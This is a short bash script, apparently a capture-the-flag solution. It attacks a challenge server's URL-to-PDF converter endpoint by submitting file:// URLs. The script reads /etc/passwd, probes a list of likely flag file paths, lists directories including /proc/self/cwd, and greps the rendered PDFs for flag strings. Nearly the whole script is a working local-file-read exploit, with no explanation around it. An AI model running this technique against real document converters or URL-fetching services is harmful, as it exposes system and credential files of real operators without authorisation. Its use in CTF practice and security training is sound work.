#!/bin/bash

URL="http://txg.chal2.teagod.tech:8722/convert"

echo "[1] Verificando file:// con /etc/passwd..."
curl -s -X POST "$URL" -d "url=file:///etc/passwd" -o passwd.pdf
if pdftotext passwd.pdf - 2>/dev/null | head -1 | grep -q "root"; then
    echo "[+] file:// FUNCIONA!"
else
    echo "[-] file:// no funciona o no muestra nada"
fi

echo -e "\n[2] Buscando flag en ubicaciones comunes..."
paths=(
    "/flag.txt"
    "/flag"
    "/app/flag.txt"
    "/app/flag"
    "/home/flag.txt"
    "/home/ctf/flag"
    "/root/flag.txt"
    "/tmp/flag"
    "/var/flag.txt"
)

for path in "${paths[@]}"; do
    echo "[*] Probando: file://$path"
    curl -s -X POST "$URL" -d "url=file://$path" -o "test${path//\//_}.pdf"
    text=$(pdftotext "test${path//\//_}.pdf" - 2>/dev/null)
    if [ ! -z "$text" ]; then
        echo "[+] CONTENIDO ENCONTRADO:"
        echo "$text"
        echo "---"
    fi
done

echo -e "\n[3] Listando directorios..."
for dir in "/" "/app" "/home" "/proc/self/cwd"; do
    echo "[*] Directorio: $dir"
    curl -s -X POST "$URL" -d "url=file://$dir" -o "dir${dir//\//_}.pdf"
    pdftotext -layout "dir${dir//\//_}.pdf" - 2>/dev/null | head -20
    echo "---"
done

echo -e "\n[4] Buscando flags en todos los PDFs..."
grep -r -oE "(flag|CTF|HTB)\{[^}]+\}" *.pdf 2>/dev/null
strings *.pdf 2>/dev/null | grep -oE "(flag|CTF|HTB)\{[^}]+\}"
